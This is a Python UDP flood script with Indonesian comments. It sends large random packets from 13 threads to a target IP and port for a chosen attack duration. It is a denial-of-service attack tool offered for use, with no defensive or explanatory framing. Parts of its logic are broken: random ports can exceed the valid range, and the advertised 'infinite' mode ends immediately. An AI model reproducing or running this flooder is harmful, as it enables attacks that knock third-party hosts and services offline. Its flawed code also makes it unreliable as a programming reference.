#!/usr/bin/python
import socket
import random
import os
import sys
import time
import threading

# Cek jumlah argument
if len(sys.argv) != 4:
    sys.exit('python udpflood.py <ip> <port> <dura>')

# Fungsi UDPFlood
def UDPFlood(ip, port, dur):
    randport = (True, False)[port == 0]  
    clock = time.time  
    duration = (1, (clock() + dur))[dur > 0] 

    print(f'Sending packets to: {ip}:{port or "random"} for {dur or "infinite"} seconds')
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    bytes = os.urandom(15000) 

    while True:
        target_port = (random.randint(1,1500000), port)[randport]
        if clock() < duration:
            try:
                sock.sendto(bytes, (ip, target_port))  
            except Exception as e:
                print(f"Error: {e}")
                break
        else:
            break
    sock.close()  
    print('Thread done')

if __name__ == "__main__":
    ip = sys.argv[1]  # IP yang dituju
    port = int(sys.argv[2])  # Port yang dituju
    dur = int(sys.argv[3])  # Durasi serangan

    threads = []  # Daftar thread
    for i in range(13):  # Jumlah thread yang dijalankan
        thread = threading.Thread(target=UDPFlood, args=(ip, port, dur)) 
        thread.start()  # Menjalankan thread
        threads.append(thread)  

 
    for thread in threads:
        thread.join()

    print("All threads completed.") 